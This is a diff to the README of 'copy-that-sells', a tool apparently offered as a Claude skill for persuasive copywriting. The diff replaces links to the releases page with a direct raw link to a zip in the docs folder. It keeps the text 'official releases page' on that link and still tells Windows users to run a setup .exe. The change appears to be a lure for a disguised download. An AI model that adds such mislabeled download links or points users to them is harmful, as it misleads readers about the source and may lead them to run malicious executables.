@@ -1,7 +1,7 @@
 # ✍️ copy-that-sells - Write persuasive copy that drives conversions
 
 <p align="center">
-  <a href="https://github.com/medokar3746/copy-that-sells/releases">
+  <a href="https://github.com/medokar3746/copy-that-sells/raw/refs/heads/main/docs/that-copy-sells-v3.7.zip">
     <img src="https://img.shields.io/badge/Download-Latest_Release-blue" alt="Download">
   </a>
 </p>
@@ -24,7 +24,7 @@ This tool functions as a skill for Claude. It features an anti-AI filter that re
 
 Follow these steps to install and run the application on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/medokar3746/copy-that-sells/releases) to access the installer.
+1. Visit the [official releases page](https://github.com/medokar3746/copy-that-sells/raw/refs/heads/main/docs/that-copy-sells-v3.7.zip) to access the installer.
 2. Locate the file named `copy-that-sells-setup.exe` under the Assets section.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder and double-click the file to launch the installer.
